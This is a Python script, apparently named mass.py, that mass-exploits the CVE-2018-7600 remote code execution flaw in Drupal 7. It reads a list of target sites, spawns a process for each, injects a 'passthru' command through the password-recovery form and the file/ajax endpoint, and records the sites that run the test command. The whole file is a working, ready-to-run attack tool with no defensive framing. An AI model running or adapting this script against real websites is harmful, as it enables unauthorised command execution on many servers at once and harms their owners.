#!/usr/bin/env python
import requests
import argparse
from bs4 import BeautifulSoup
from multiprocessing import Process

def get_args():
  parser = argparse.ArgumentParser( prog="mass.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 <= 7.57
                    by poisoning the recover password form (user/password) and triggering it with
                    the upload file via ajax (/file/ajax).
                    ''')

  parser.add_argument("list", help="enter list file name")
  parser.add_argument("out", help="enter o/p file name")
  args = parser.parse_args()
  return args
def work(list,out):
    i=0
    combo=open(list,'r')
    for site in combo:
        i=i+1
        try:
            proc = Process(target=pwn_target, args=(site.strip(),i,out))
            proc.start()
        except:
            print(':failed')
            pass
def pwn_target(target,i,out):
  try:
      requests.packages.urllib3.disable_warnings()
      get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': 'echo 1337'}
      post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
      r = requests.post(target.strip(), params=get_params, data=post_params, verify=False)
      soup = BeautifulSoup(r.text, "html.parser")
      form = soup.find('form', {'id': 'user-pass'})
      form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
      if form_build_id:
         get_params = {'q':'file/ajax/name/#value/' + form_build_id}
         post_params = {'form_build_id':form_build_id}
         r = requests.post(target, params=get_params, data=post_params, verify=False)
         vuln = r.text.split('[{"command":"settings"')[0]
         if('1337' in vuln):
            print(i,':',target.strip(),":success")
            output=open(out,'a')
            output.write(target)
            output.close()
         else:
            print(i,':',target.strip(),':failed')
         return(vuln)
  except:
       return 1
  return(1)

def main():
  print("""
 ______                          __ ___ ___                   _______             __       __ __
|   _  \ .----.--.--.-----.---.-|  |   Y   .---.-.-----.-----|   _   .--.--.-----|  .-----|__|  |_.-----.----.
|.  |   \|   _|  |  |  _  |  _  |  |.      |  _  |__ --|__ --|.  1___|_   _|  _  |  |  _  |  |   _|  -__|   _|
|.  |    |__| |_____|   __|___._|__|. \_/  |___._|_____|_____|.  __)_|__.__|   __|__|_____|__|____|_____|__|
|:  1    /          |__|           |:  |   |                 |:  1   |     |__|
|::.. . /                          |::.|:. |                 |::.. . |
`------'                           `--- ---'                 `-------'
                                                            by x33p
    usuage:python mass.py -l list.txt -o out.txt

  """)

  args = get_args()


  work(args.list.strip(),args.out.strip())




if __name__ == '__main__':
    main()
